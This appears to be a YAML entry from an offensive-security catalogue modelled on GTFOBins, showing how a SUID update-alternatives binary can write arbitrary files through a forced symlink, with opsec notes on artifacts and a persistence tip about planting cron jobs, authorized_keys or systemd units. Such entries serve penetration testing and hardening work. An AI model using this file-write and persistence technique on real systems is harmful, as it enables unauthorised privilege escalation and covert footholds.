---
name: update-alternatives
capabilities:
- write
required_permissions:
  level: suid
  notes: Requires SUID bit set on the binary.
difficulty: low
opsec:
  noise: low
  artifacts:
  - ~/.bash_history
  - File timestamps / inotify events on target paths
  notes: ''
persistence_potential: true
examples:
- id: file-write
  description: Write content to an arbitrary file.
  capabilities:
  - write
  command: |-
    echo DATA >/path/to/temp-file
    update-alternatives --force --install /path/to/output-file x /path/to/temp-file 0
  notes: Write in `/path/to/output-file` a symlink to `/path/to/temp-file`.
references:
- https://gtfobins.github.io/gtfobins/update-alternatives/
tags: []
persistence_notes: Combine with write/exec primitives to drop cron entries, authorized_keys, or systemd units.
---
